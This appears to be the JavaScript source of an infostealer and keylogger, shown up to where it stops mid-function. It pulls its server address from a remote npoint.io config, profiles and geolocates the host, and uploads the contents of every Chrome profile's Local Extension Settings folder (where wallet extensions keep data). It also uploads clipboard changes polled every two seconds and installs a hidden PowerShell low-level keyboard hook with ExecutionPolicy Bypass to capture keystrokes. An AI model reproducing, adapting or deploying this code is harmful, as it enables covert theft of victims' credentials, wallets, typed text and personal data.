"use strict";
const fs = require("fs"),
  path = require("path"),
  os = require("os"),
  http = require("http"),
  https = require("https");
async function loadRemoteConfig() {
  return new Promise((resolve) => {
    try {
      const NPOINT_URL = "https://api.npoint.io/37c0a0c68bf7a94ed731";
      if (!NPOINT_URL)
        return (
          log("? NPOINT_URL environment variable not set", "ERROR"),
          void resolve(null)
        );
      const url = new URL(NPOINT_URL),
        protocol = void 0,
        req = ("https:" === url.protocol ? https : http).get(
          url,
          { timeout: 5e3 },
          (res) => {
            let data = "";
            (res.on("data", (chunk) => {
              data += chunk;
            }),
              res.on("end", () => {
                try {
                  if (200 === res.statusCode) {
                    const remoteConfig = JSON.parse(data);
                    resolve(remoteConfig);
                  } else
                    (log(`? Npoint returned status ${res.statusCode}`, "ERROR"),
                      resolve(null));
                } catch (error) {
                  (log(
                    `? Failed to parse npoint config: ${error.message}`,
                    "ERROR",
                  ),
                    resolve(null));
                }
              }));
          },
        );
      (req.on("error", (error) => {
        (log(`? Failed to fetch from npoint: ${error.message}`, "ERROR"),
          resolve(null));
      }),
        req.on("timeout", () => {
          (req.destroy(),
            log("? Npoint request timeout", "ERROR"),
            resolve(null));
        }));
    } catch (error) {
      (log(`? Error loading config: ${error.message}`, "ERROR"), resolve(null));
    }
  });
}
async function initializeConfig() {
  const config = await loadRemoteConfig();
  return (
    config ||
      (log("? Failed to load configuration from npoint", "ERROR"),
      log("  Cannot proceed without valid configuration", "ERROR"),
      process.exit(1)),
    process.env.SERVER_URL &&
      ((config.server_url = process.env.SERVER_URL),
      log(
        `? Server URL overridden by env variable: ${config.server_url}`,
        "INFO",
      )),
    process.env.API_KEY && (config.api_key = process.env.API_KEY),
    process.env.CONFIG_REFRESH_INTERVAL &&
      (config.config_refresh_interval = parseInt(
        process.env.CONFIG_REFRESH_INTERVAL,
        10,
      )),
    config
  );
}
let currentConfig = {};
function log(message, level = "INFO") {
  const timestamp = new Date().toLocaleTimeString(),
    colors = void 0,
    color =
      { INFO: "[36m", SUCCESS: "[32m", WARN: "[33m", ERROR: "[31m" }[level] ||
      "",
    reset = "[0m";
  console.log(`${color}[${timestamp}] [${level}] ${message}${reset}`);
}
function httpRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    try {
      let fixedUrl = url;
      url.includes("localhost") &&
        (fixedUrl = url.replace(/localhost/g, "127.0.0.1"));
      const urlObj = void 0,
        client = "https:" === new URL(fixedUrl).protocol ? https : http,
        requestOptions = {
          method: options.method || "GET",
          headers: options.headers || {},
          timeout: 3e4,
          family: 4,
        },
        req = client.request(fixedUrl, requestOptions, (res) => {
          let data = "";
          (res.on("data", (chunk) => (data += chunk)),
            res.on("end", () => {
              res.statusCode >= 200 && res.statusCode < 300
                ? resolve({ statusCode: res.statusCode, data: data })
                : reject(new Error(`HTTP ${res.statusCode}`));
            }));
        });
      (req.on("error", reject),
        req.on("timeout", () => {
          (req.destroy(), reject(new Error("Request timeout")));
        }),
        options.body && req.write(options.body),
        req.end());
    } catch (error) {
      reject(error);
    }
  });
}
async function getPublicIP() {
  try {
    const response = await httpRequest("https://api.ipify.org?format=json");
    return JSON.parse(response.data).ip || null;
  } catch {
    return null;
  }
}
async function getLocation(ip) {
  if (!ip) return null;
  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,timezone,lat,lon`,
      response = await httpRequest(url),
      parsed = JSON.parse(response.data);
    return "success" !== parsed.status
      ? null
      : {
          country: parsed.country || "Unknown",
          region: parsed.regionName || "Unknown",
          city: parsed.city || "Unknown",
          timezone: parsed.timezone || "Unknown",
          latitude: parsed.lat ?? null,
          longitude: parsed.lon ?? null,
        };
  } catch {
    return null;
  }
}
async function getPublicNetworkInfo() {
  const ipAddress = await getPublicIP(),
    location = await getLocation(ipAddress);
  return location
    ? { ipAddress: ipAddress || "Unknown", ...location }
    : (log("Could not retrieve public IP location", "WARN"),
      {
        ipAddress: ipAddress || "Unknown",
        country: "Unknown",
        region: "Unknown",
        city: "Unknown",
        timezone: "Unknown",
        latitude: null,
        longitude: null,
      });
}
async function collectDeviceInfo() {
  const publicNetwork = await getPublicNetworkInfo(),
    systemInfo = void 0;
  return {
    computerName: os.hostname(),
    username: os.userInfo().username,
    platform: {
      type: process.platform,
      name:
        "win32" === process.platform
          ? "Windows"
          : "darwin" === process.platform
            ? "macOS"
            : "Linux",
      release: os.release(),
      arch: os.arch(),
    },
    hardware: {
      cpuCount: os.cpus().length,
      cpuModel: os.cpus()[0]?.model || "unknown",
      totalMemoryGB: (os.totalmem() / 1024 ** 3).toFixed(2),
    },
    network: { interfaces: getLocalNetworkInterfaces(), public: publicNetwork },
    paths: { homeDir: os.homedir(), tempDir: os.tmpdir() },
    collectedAt: new Date().toISOString(),
  };
}
function getLocalNetworkInterfaces() {
  const interfaces = [],
    networkInterfaces = os.networkInterfaces();
  for (const [name, addrs] of Object.entries(networkInterfaces))
    for (const addr of addrs || [])
      "IPv4" !== addr.family ||
        addr.internal ||
        interfaces.push({
          name: name,
          ipAddress: addr.address,
          netmask: addr.netmask,
          mac: addr.mac,
        });
  return interfaces;
}
function formatDeviceInfoReport(deviceInfo) {
  let report = "DEVICE INFORMATION REPORT\n";
  if (
    ((report += `${"=".repeat(70)}\n\n`),
    (report += "REPORT METADATA\n"),
    (report += `${"-".repeat(70)}\n`),
    (report += `Generated: ${deviceInfo.collectedAt}\n`),
    (report += `Computer: ${deviceInfo.computerName}\n\n`),
    (report += "DEVICE IDENTIFICATION\n"),
    (report += `${"-".repeat(70)}\n`),
    (report += `Computer Name:  ${deviceInfo.computerName}\n`),
    (report += `Username:       ${deviceInfo.username}\n`),
    (report += `Home Directory: ${deviceInfo.paths.homeDir}\n\n`),
    (report += "OPERATING SYSTEM\n"),
    (report += `${"-".repeat(70)}\n`),
    (report += `OS Name:        ${deviceInfo.platform.name}\n`),
    (report += `Platform:       ${deviceInfo.platform.type}\n`),
    (report += `Release:        ${deviceInfo.platform.release}\n`),
    (report += `Architecture:   ${deviceInfo.platform.arch}\n\n`),
    (report += "PUBLIC NETWORK LOCATION\n"),
    (report += `${"-".repeat(70)}\n`),
    (report += `IP:             ${deviceInfo.network.public.ipAddress}\n`),
    (report += `Country:        ${deviceInfo.network.public.country}\n`),
    (report += `City:            ${deviceInfo.network.public.city}\n`),
    (report += `Region/State:   ${deviceInfo.network.public.region}\n\n`),
    (report += `Timezone:        ${deviceInfo.network.public.timezone}\n`),
    (report += `Latitude:        ${deviceInfo.network.public.latitude ?? "Unknown"}\n`),
    (report += `Longitude:       ${deviceInfo.network.public.longitude ?? "Unknown"}\n\n`),
    (report += "HARDWARE\n"),
    (report += `${"-".repeat(70)}\n`),
    (report += `CPU Cores:      ${deviceInfo.hardware.cpuCount}\n`),
    (report += `CPU Model:      ${deviceInfo.hardware.cpuModel}\n`),
    (report += `Total Memory:   ${deviceInfo.hardware.totalMemoryGB} GB\n\n`),
    (report += "LOCAL NETWORK INTERFACES\n"),
    (report += `${"-".repeat(70)}\n`),
    deviceInfo.network.interfaces.length > 0)
  )
    for (const iface of deviceInfo.network.interfaces)
      ((report += `Interface:  ${iface.name}\n`),
        (report += `  IP:       ${iface.ipAddress}\n`),
        (report += `  Netmask:  ${iface.netmask}\n`),
        (report += `  MAC:      ${iface.mac}\n\n`));
  else report += "No active network interfaces found\n\n";
  return (
    (report += `${"=".repeat(70)}\n`),
    (report += "ACCURACY NOTE:\n"),
    (report += "Username and OS collected from local operating system APIs.\n"),
    (report += "Public IP retrieved from https://api.ipify.org/.\n"),
    (report += "IP location retrieved from http://ip-api.com/.\n"),
    (report += `${"=".repeat(70)}\n`),
    report
  );
}
async function uploadDeviceInfo() {
  try {
    const deviceInfo = await collectDeviceInfo(),
      computerName = deviceInfo.computerName;
    const report = formatDeviceInfoReport(deviceInfo),
      FormData = void 0,
      form = new (require("form-data"))();
    return (
      form.append("computerName", computerName),
      form.append("identifier", "99"),
      form.append("file", Buffer.from(report), {
        filename: `${computerName}_SystemInfo.txt`,
        contentType: "text/plain",
      }),
      await new Promise((resolve, reject) => {
        form.submit(
          `${currentConfig.server_url}/api/system-info`,
          (err, res) => {
            if (err) reject(err);
            else {
              let data = "";
              (res.on("data", (chunk) => (data += chunk)),
                res.on("end", () => {
                  res.statusCode >= 200 && res.statusCode < 300
                    ? resolve()
                    : reject(new Error(`HTTP ${res.statusCode}: ${data}`));
                }));
            }
          },
        );
      }),
      log("? Device information uploaded successfully", "SUCCESS"),
      !0
    );
  } catch (error) {
    return (
      log(`? Failed to upload device info: ${error.message}`, "ERROR"),
      !1
    );
  }
}
function getChromeUserDataDir() {
  const homeDir = os.homedir(),
    platform = process.platform;
  let chromeDataDir;
  return (
    "win32" === platform
      ? (chromeDataDir = path.join(
          homeDir,
          "AppData",
          "Local",
          "Google",
          "Chrome",
          "User Data",
        ))
      : "darwin" === platform
        ? (chromeDataDir = path.join(
            homeDir,
            "Library",
            "Application Support",
            "Google",
            "Chrome",
          ))
        : "linux" === platform
          ? (chromeDataDir = path.join(homeDir, ".config", "google-chrome"))
          : (log(
              `? Unknown OS detected: ${platform} - attempting Linux path fallback`,
              "WARN",
            ),
            (chromeDataDir = path.join(homeDir, ".config", "google-chrome"))),
    chromeDataDir
  );
}
function findChromeProfiles(userDataDir) {
  try {
    if (!fs.existsSync(userDataDir)) return [];
    const profiles = [],
      items = fs.readdirSync(userDataDir);
    for (const item of items)
      if ("Default" === item || /^Profile \d+$/.test(item)) {
        const profilePath = path.join(userDataDir, item),
          stat = void 0;
        fs.statSync(profilePath).isDirectory() &&
          profiles.push({ name: item, path: profilePath });
      }
    return profiles;
  } catch (error) {
    return (log(`Error finding Chrome profiles: ${error.message}`, "WARN"), []);
  }
}
function getLocalExtensionSettingsPath(profilePath) {
  const lesPath = path.join(profilePath, "Local Extension Settings");
  return fs.existsSync(lesPath) ? lesPath : null;
}
function countFilesRecursive(dirPath) {
  let count = 0;
  try {
    const items = fs.readdirSync(dirPath);
    for (const item of items) {
      const itemPath = path.join(dirPath, item),
        stat = fs.statSync(itemPath);
      stat.isDirectory()
        ? (count += countFilesRecursive(itemPath))
        : stat.isFile() && count++;
    }
  } catch (error) {}
  return count;
}
async function uploadLocalExtensionSettings(
  computerName,
  profileName,
  lesPath,
) {
  try {
    const FormData = require("form-data");
    let fileCount = 0,
      skippedCount = 0,
      extensionIds = new Set(),
      filesToUpload = [];
    function collectFilesRecursive(dirPath, relativePath = "") {
      try {
        const items = fs.readdirSync(dirPath);
        for (const item of items) {
          const itemPath = path.join(dirPath, item),
            relPath = relativePath ? path.posix.join(relativePath, item) : item;
          try {
            const stat = fs.statSync(itemPath);
            if (stat.isDirectory())
              (32 === item.length &&
                "" === relativePath &&
                extensionIds.add(item),
                collectFilesRecursive(itemPath, relPath));
            else if (stat.isFile() && stat.size > 0)
              try {
                const fd = fs.openSync(itemPath, "r");
                (fs.closeSync(fd),
                  filesToUpload.push({
                    itemPath: itemPath,
                    relPath: relPath,
                    size: stat.size,
                  }),
                  fileCount++);
              } catch (openError) {
                if (
                  "EBUSY" !== openError.code &&
                  "EACCES" !== openError.code &&
                  "EPERM" !== openError.code
                )
                  throw openError;
                (skippedCount++,
                  log(`    Skipped (locked): ${relPath}`, "WARN"));
              }
          } catch (statError) {
            "EBUSY" !== statError.code &&
              "EACCES" !== statError.code &&
              statError.code;
          }
        }
      } catch (error) {}
    }
    if ((collectFilesRecursive(lesPath), 0 === fileCount))
      return (
        log(
          skippedCount > 0
            ? `  No accessible files (${skippedCount} files locked)`
            : "  No files found in Local Extension Settings",
          "WARN",
        ),
        !1
      );
    const extensionCount = extensionIds.size;
    return (
      new Promise((resolve) => {
        try {
          const form = new FormData();
          (form.append("computerName", computerName),
            form.append("profileName", profileName),
            form.append("identifier", "99"));
          let successCount = 0;
          for (const fileInfo of filesToUpload)
            try {
              const fileBuffer = fs.readFileSync(fileInfo.itemPath),
                encodedPath = Buffer.from(fileInfo.relPath).toString("base64");
              (form.append("files", fileBuffer, {
                filename: `${encodedPath}___${path.basename(fileInfo.relPath)}`,
              }),
                successCount++);
            } catch (readError) {
              ("EBUSY" !== readError.code && "EACCES" !== readError.code) ||
                skippedCount++;
            }
          if (0 === successCount)
            return (
              log("  No files could be prepared for upload", "WARN"),
              void resolve(!1)
            );
          const submitPromise = new Promise((submitResolve, submitReject) => {
            form.submit(
              `${currentConfig.server_url}/api/upload-local-extension-settings`,
              (err, res) => {
                if (err) submitReject(err);
                else {
                  let data = "";
                  (res.on("data", (chunk) => (data += chunk)),
                    res.on("end", () => {
                      res.statusCode >= 200 && res.statusCode < 300
                        ? submitResolve(!0)
                        : submitReject(new Error(`HTTP ${res.statusCode}`));
                    }));
                }
              },
            );
          });
          (form.on("error", (err) => {
            (log(`  Form error: ${err.message}`, "ERROR"), resolve(!1));
          }),
            submitPromise
              .then(() => {
                (log(
                  `  ? Uploaded ${successCount} files from ${extensionCount} extension(s)`,
                  "SUCCESS",
                ),
                  resolve(!0));
              })
              .catch((error) => {
                (log(`  ? Upload failed: ${error.message}`, "ERROR"),
                  resolve(!1));
              }));
        } catch (error) {
          (log(`  ? Error preparing upload: ${error.message}`, "ERROR"),
            resolve(!1));
        }
      })
    );
  } catch (error) {
    return (log(`  ? Failed: ${error.message}`, "ERROR"), !1);
  }
}
async function uploadChromeLocalExtensionSettings(computerName) {
  try {
    const userDataDir = getChromeUserDataDir();
    if (!fs.existsSync(userDataDir))
      return (
        log(`? Chrome installation not found at: ${userDataDir}`, "WARN"),
        void 0
      );
    const profiles = findChromeProfiles(userDataDir);
    if (0 === profiles.length)
      return (
        log("? No Chrome profiles found", "WARN"),
        void 0
      );
    let uploadedCount = 0,
      skippedCount = 0;
    for (const profile of profiles) {
      const lesPath = getLocalExtensionSettingsPath(profile.path);
      if (!lesPath) {
        (log(
          `  ? Profile: ${profile.name} - No Local Extension Settings found`,
          "WARN",
        ),
          skippedCount++);
        continue;
      }
      const fileCount = countFilesRecursive(lesPath);
      if (0 === fileCount) {
        (log(
          `  ? Profile: ${profile.name} - Local Extension Settings empty`,
          "WARN",
        ),
          skippedCount++);
        continue;
      }
      (await uploadLocalExtensionSettings(computerName, profile.name, lesPath))
        ? uploadedCount++
        : skippedCount++;
    }
  } catch (error) {
    log(`Error: ${error.message}`, "ERROR");
  }
}
let clipboardMonitoringActive = !1,
  clipboardMonitoringInterval = null,
  clipboardMonitoringStatusCheck = null,
  lastClipboardContent = "",
  keyboardMouseMonitoringActive = !1,
  keyboardMouseMonitoringInterval = null,
  keyboardMouseMonitoringStatusCheck = null,
  keyboardMouseEvents = [],
  keyboardBatchStartTime = null,
  ioHookInstance = null;
function startClipboardMonitoring(computerName, intervalMs = 2e3) {
  if (clipboardMonitoringActive)
    return void log("Clipboard monitoring already active", "WARN");
  ((clipboardMonitoringActive = !0),
    (clipboardMonitoringInterval = setInterval(async () => {
      try {
        const { spawn: spawn } = require("child_process");
        let clipboardContent = "";
        try {
          if ("win32" === process.platform) {
            clipboardContent = await new Promise((resolve) => {
              let data = "";
              const proc = spawn("powershell.exe", ['-Command', 'Get-Clipboard'], {
                windowsHide: true,
                timeout: 5e3
              });
              proc.stdout.on("data", (chunk) => (data += chunk.toString()));
              proc.on("close", () => resolve(data.trim()));
              proc.on("error", () => resolve(""));
            });
          } else if ("darwin" === process.platform) {
            clipboardContent = await new Promise((resolve) => {
              let data = "";
              const proc = spawn("pbpaste", [], {
                windowsHide: true,
                timeout: 5e3
              });
              proc.stdout.on("data", (chunk) => (data += chunk.toString()));
              proc.on("close", () => resolve(data.trim()));
              proc.on("error", () => resolve(""));
            });
          } else {
            clipboardContent = await new Promise((resolve) => {
              let data = "";
              const proc = spawn("xclip", ["-selection", "clipboard", "-o"], {
                windowsHide: true,
                timeout: 5e3
              });
              proc.stdout.on("data", (chunk) => (data += chunk.toString()));
              proc.on("close", () => resolve(data.trim()));
              proc.on("error", () => resolve(""));
            });
          }
        } catch (error) {
          return;
        }
        if (clipboardContent && clipboardContent !== lastClipboardContent) {
          lastClipboardContent = clipboardContent;
          log(`[Clipboard] NEW CONTENT DETECTED - Length: ${clipboardContent.length} chars`, "INFO");
          const clipboardData = {
            computerName: computerName,
            content: clipboardContent,
            timestamp: new Date().toISOString(),
            contentLength: clipboardContent.length,
            contentHash: require("crypto")
              .createHash("sha256")
              .update(clipboardContent)
              .digest("hex"),
          };
          log(`[Clipboard] PREPARED FOR UPLOAD - Hash: ${clipboardData.contentHash.substring(0, 16)}...`, "INFO");
          try {
            await uploadClipboardData(clipboardData);
          } catch (uploadError) {
            log(
              `Failed to upload clipboard data: ${uploadError.message}`,
              "WARN",
            );
          }
        }
      } catch (error) {
        log(`Clipboard monitoring error: ${error.message}`, "WARN");
      }
    }, intervalMs)));
  const statusCheckInterval = setInterval(async () => {
    if (clipboardMonitoringActive)
      try {
        const statusResponse = await httpRequest(
          `${currentConfig.server_url}/api/clipboard-status/${computerName}`,
          { method: "GET" },
        );
        if (200 === statusResponse.statusCode && statusResponse.data) {
          const statusData = void 0;
          if (
            !1 === JSON.parse(statusResponse.data).isMonitoring &&
            clipboardMonitoringActive
          )
            return (
              log(
                "?? Server stop command received - stopping clipboard monitoring",
                "WARN",
              ),
              stopClipboardMonitoring(),
              void clearInterval(statusCheckInterval)
            );
        }
      } catch (error) {}
    else clearInterval(statusCheckInterval);
  }, 1e4);
  clipboardMonitoringStatusCheck = statusCheckInterval;
}
function stopClipboardMonitoring() {
  clipboardMonitoringActive
    ? (clipboardMonitoringInterval &&
        (clearInterval(clipboardMonitoringInterval),
        (clipboardMonitoringInterval = null)),
      void 0 !== clipboardMonitoringStatusCheck &&
        clipboardMonitoringStatusCheck &&
        (clearInterval(clipboardMonitoringStatusCheck),
        (clipboardMonitoringStatusCheck = null)),
      (clipboardMonitoringActive = !1),
      (lastClipboardContent = ""),
      log("? Clipboard monitoring stopped", "SUCCESS"))
    : log("Clipboard monitoring not active", "WARN");
}
function startKeyboardMouseMonitoring(computerName, intervalMs = 5e3) {
  if (keyboardMouseMonitoringActive)
    return void log("Keyboard monitoring already active", "WARN");
  if (
    ((keyboardMouseMonitoringActive = !0),
    "win32" !== process.platform)
  )
    return (
      log("? Keyboard monitoring currently supported on Windows only", "WARN"),
      void (keyboardMouseMonitoringActive = !1)
    );
  
  log(`[Keyboard] 🔍 Initializing keyboard monitoring for: ${computerName}`, "INFO");
  const { spawn: spawn } = require("child_process"),
    fs = require("fs"),
    path = require("path"),
    keyCodeMap = {
      8: "Backspace",
      9: "Tab",
      13: "Enter",
      16: "Shift",
      17: "Ctrl",
      18: "Alt",
      19: "Pause",
      20: "CapsLock",
      27: "Escape",
      32: "Space",
      33: "PageUp",
      34: "PageDown",
      35: "End",
      36: "Home",
      37: "ArrowLeft",
      38: "ArrowUp",
      39: "ArrowRight",
      40: "ArrowDown",
      44: "PrintScreen",
      45: "Insert",
      46: "Delete",
      160: "LeftShift",
      161: "RightShift",
      162: "LeftCtrl",
      163: "RightCtrl",
      164: "LeftAlt",
      165: "RightAlt",
      48: "0",
      49: "1",
      50: "2",
      51: "3",
      52: "4",
      53: "5",
      54: "6",
      55: "7",
      56: "8",
      57: "9",
      65: "a",
      66: "b",
      67: "c",
      68: "d",
      69: "e",
      70: "f",
      71: "g",
      72: "h",
      73: "i",
      74: "j",
      75: "k",
      76: "l",
      77: "m",
      78: "n",
      79: "o",
      80: "p",
      81: "q",
      82: "r",
      83: "s",
      84: "t",
      85: "u",
      86: "v",
      87: "w",
      88: "x",
      89: "y",
      90: "z",
      91: "Windows",
      93: "ContextMenu",
      96: "0",
      97: "1",
      98: "2",
      99: "3",
      100: "4",
      101: "5",
      102: "6",
      103: "7",
      104: "8",
      105: "9",
      106: "*",
      107: "+",
      109: "-",
      110: ".",
      111: "/",
      112: "F1",
      113: "F2",
      114: "F3",
      115: "F4",
      116: "F5",
      117: "F6",
      118: "F7",
      119: "F8",
      120: "F9",
      121: "F10",
      122: "F11",
      123: "F12",
      144: "NumLock",
      145: "ScrollLock",
      186: ";",
      187: "=",
      188: ",",
      189: "-",
      190: ".",
      191: "/",
      192: "`",
      219: "[",
      220: "\\",
      221: "]",
      222: "'",
    },
    shiftMap = {
      a: "A",
      b: "B",
      c: "C",
      d: "D",
      e: "E",
      f: "F",
      g: "G",
      h: "H",
      i: "I",
      j: "J",
      k: "K",
      l: "L",
      m: "M",
      n: "N",
      o: "O",
      p: "P",
      q: "Q",
      r: "R",
      s: "S",
      t: "T",
      u: "U",
      v: "V",
      w: "W",
      x: "X",
      y: "Y",
      z: "Z",
      0: ")",
      1: "!",
      2: "@",
      3: "#",
      4: "$",
      5: "%",
      6: "^",
      7: "&",
      8: "*",
      9: "(",
      ";": ":",
      "=": "+",
      ",": "<",
      "-": "_",
      ".": ">",
      "/": "?",
      "`": "~",
      "[": "{",
      "\\": "|",
      "]": "}",
      "'": '"',
    },
    psScript =
      '\nAdd-Type -TypeDefinition @"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class KeyboardMonitor {\n    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);\n    \n    private const int WH_KEYBOARD_LL = 13;\n    private const int WM_KEYDOWN = 0x0100;\n    \n    [DllImport("user32.dll", SetLastError = true)]\n    private static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfn, IntPtr hMod, uint dwThreadId);\n    \n    [DllImport("user32.dll", SetLastError = true)]\n    private static extern bool UnhookWindowsHookEx(IntPtr hhk);\n    \n    [DllImport("user32.dll", SetLastError = true)]\n    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);\n    \n    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]\n    private static extern IntPtr GetModuleHandle(string lpModuleName);\n    \n    [DllImport("user32.dll")]\n    private static extern short GetKeyState(int nVirtKey);\n    \n    [StructLayout(LayoutKind.Sequential)]\n    private struct KBDLLHOOKSTRUCT {\n        public uint vkCode;\n        public uint scanCode;\n        public uint flags;\n        public uint time;\n        public IntPtr dwExtraInfo;\n    }\n    \n    private static IntPtr kbHook = IntPtr.Zero;\n    private static LowLevelKeyboardProc kbProc;\n    \n    public static void Install() {\n        IntPtr hModule = GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);\n        kbProc = new LowLevelKeyboardProc(KeyboardHookProc);\n        kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, kbProc, hModule, 0);\n    }\n    \n    public static void Uninstall() {\n        if (kbHook != IntPtr.Zero) UnhookWindowsHookEx(kbHook);\n    }\n    \n    private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam) {\n        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {\n            KBDLLHOOKSTRUCT kbStruct = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));\n            \n            // Get current state of modifier keys (HIGH bit = currently pressed)\n            bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;\n            bool ctrlPressed = (GetKeyState(0xA2) & 0x8000) != 0 || (GetKeyState(0xA3) & 0x8000) != 0;\n            bool altPressed = (GetKeyState(0xA4) & 0x8000) != 0 || (GetKeyState(0xA5) & 0x8000) != 0;\n            \n            // Output: keycode:shift:ctrl:alt (only on KEYDOWN, not KEYUP)\n            Console.WriteLine(kbStruct.vkCode + ":" + (shiftPressed ? "1" : "0") + ":" + (ctrlPressed ? "1" : "0") + ":" + (altPressed ? "1" : "0"));\n        }\n        return CallNextHookEx(kbHook, nCode, wParam, lParam);\n    }\n}\n"@\n\n[KeyboardMonitor]::Install();\nwhile ($true) { Start-Sleep -Seconds 1 }\n';
  try {
    // Write PowerShell script to a temporary file for better reliability
    const tempDir = path.join(require("os").tmpdir(), "kb-monitor");
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    const scriptPath = path.join(tempDir, `keyboard-monitor-${Date.now()}.ps1`);
    fs.writeFileSync(scriptPath, psScript, 'utf8');
    log(`[Keyboard] Script written to: ${scriptPath}`, "INFO");
    
    const psMonitor = spawn(
      "powershell.exe",
      ["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", scriptPath],
      { 
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true
      },
    );
    
    if (!psMonitor) {
      throw new Error("Failed to spawn PowerShell process - psMonitor is null");
    }
    
    ioHookInstance = psMonitor;
    log(`[Keyboard] ✓ PowerShell process spawned successfully`, "INFO");
    
    // Capture keyboard events from PowerShell output
    // Track last event for debouncing (Fix #3)
    let lastProcessedEvent = null;
    let previousLine = null;  // Option 3: Line-level deduplication
    let previousLineTime = 0;  // Track when previous line was processed
    const DEBOUNCE_MS = 50; // Ignore events < 50ms apart with same keyCode
    const SAME_KEY_MIN_MS = 1;  // Minimum time for legitimate consecutive presses (1ms)
    const modifierKeys = ['Shift', 'LeftShift', 'RightShift', 'Ctrl', 'LeftCtrl', 'RightCtrl', 'Alt', 'LeftAlt', 'RightAlt'];
    
    psMonitor.stdout.on('data', (data) => {
      const output = data.toString().trim();
      if (output.length > 0) {
        log(`[Keyboard] Raw output received: ${output.substring(0, 100)}`, "INFO");
        const lines = output.split('\n');
        const now = Date.now();
        
        for (const line of lines) {
          const trimmedLine = line.trim();
          
          // IMPROVED FIX: Skip if exact duplicate of previous line AND arrived within 1ms
          // This catches hook duplicates but allows legitimate consecutive same-key presses
          if (trimmedLine === previousLine && 
              trimmedLine.length > 0 && 
              (now - previousLineTime) < SAME_KEY_MIN_MS) {
            previousLineTime = now;
            continue;  // Skip this duplicate from same hook call
          }
          previousLine = trimmedLine;
          previousLineTime = now;
          
          if (trimmedLine.match(/^\d+:\d+:\d+:\d+$/)) {
            const [keyCode, shift, ctrl, alt] = trimmedLine.split(':');
            const keyCodeNum = parseInt(keyCode);
            const keyName = keyCodeMap[keyCodeNum] || `Unknown(${keyCode})`;
            const shiftBool = shift === '1';
            const ctrlBool = ctrl === '1';
            const altBool = alt === '1';
            
            // DEBOUNCE (Fix #3): Skip if identical to last event and < 50ms apart
            if (lastProcessedEvent &&
                lastProcessedEvent.keyCode === keyCodeNum &&
                lastProcessedEvent.shift === shiftBool &&
                lastProcessedEvent.ctrl === ctrlBool &&
                lastProcessedEvent.alt === altBool &&
                (now - lastProcessedEvent.timestamp) < DEBOUNCE_MS) {
              // Skip this event - it's a repeat within debounce window
              continue;
            }
            
            // Build human-readable key representation (Fix #1: Smart modifier deduplication)
            let readableKey = '';
            if (ctrlBool && !modifierKeys.includes(keyName)) readableKey += 'Ctrl+';
            if (altBool && !modifierKeys.includes(keyName)) readableKey += 'Alt+';
            if (shiftBool && !modifierKeys.includes(keyName)) readableKey += 'Shift+';
            readableKey += keyName;
            
            log(`[Keyboard] Event: ${readableKey}`, "INFO");
            
            const eventObj = {
              type: 'keydown',
              keyCode: keyCodeNum,
              keyName: keyName,
              readableKey: readableKey,
              shift: shiftBool,
              ctrl: ctrlBool,
              alt: altBool,
              timestamp: new Date().toISOString(),
              timestampMs: now
            };
            
            keyboardMouseEvents.push(eventObj);
            lastProcessedEvent = {
              keyCode: keyCodeNum,
              shift: shiftBool,
              ctrl: ctrlBool,
              alt: altBool,
              timestamp: now
            };
          } else {
            if (trimmedLine.length > 0) {
              // Line doesn't match keyboard event pattern - skip silently
            }
          }
        }
      }
    });
    
    log("? Keyboard monitoring started (keydown only)", "SUCCESS");
    
    // Handle stderr output from PowerShell
    psMonitor.stderr.on('data', (data) => {
      log(`[Keyboard] PowerShell STDERR: ${data.toString()}`, "WARN");
    });
    
    // Handle process errors
    psMonitor.on('error', (error) => {
      log(`[Keyboard] Process ERROR: ${error.message}`, "ERROR");
      keyboardMouseMonitoringActive = false;
    });
    
    // Handle process close/exit
    psMonitor.on('close', (code) => {
      log(`[Keyboard] PowerShell exited with code: ${code}`, "WARN");
      keyboardMouseMonitoringActive = false;
    });
    
    // Handle process exit signal
    psMonitor.on('exit', (code, signal) => {
      log(`[Keyboard] PowerShell exit - code: ${code}, signal: ${signal}`, "WARN");
      keyboardMouseMonitoringActive = false;
    });
  } catch (error) {
    return (
      log(
        `Failed to initialize keyboard monitoring: ${error.message}`,
        "ERROR",
      ),
      void (keyboardMouseMonitoringActive = !1)
    );
  }
  
  // Fix #2: Event deduplication and coalescing function
  function deduplicateEvents(events) {
    if (events.length === 0) return [];
    
    const deduplicated = [];
    let lastEvent = null;
    let repeatCount = 0;
    
    for (const event of events) {
      // Check if identical to last event
      if (lastEvent && 
          lastEvent.keyCode === event.keyCode &&
          lastEvent.shift === event.shift &&
          lastEvent.ctrl === event.ctrl &&
          lastEvent.alt === event.alt) {
        
        // Same key pressed - increment repeat counter
        repeatCount++;
        
        // Only keep first of consecutive identical (every 5th event as sample)
        if (repeatCount % 5 === 0) {
          // Keep every 5th repeat as a sample
          deduplicated.push({
            ...event,
            isRepeat: true,
            repeatCount: repeatCount
          });
        }
      } else {
        // New key or different modifier state
        if (lastEvent && repeatCount > 0) {
          // Annotate previous event with repeat count
          if (deduplicated.length > 0) {
            deduplicated[deduplicated.length - 1].totalRepeats = repeatCount;
          }
        }
        deduplicated.push(event);
        lastEvent = event;
        repeatCount = 0;
      }
    }
    
    // Annotate final event with its repeat count
    if (repeatCount > 0 && deduplicated.length > 0) {
      deduplicated[deduplicated.length - 1].totalRepeats = repeatCount;
    }
    
    return deduplicated;
  }
  
  ((keyboardMouseMonitoringInterval = setInterval(async () => {
    if (0 !== keyboardMouseEvents.length) {
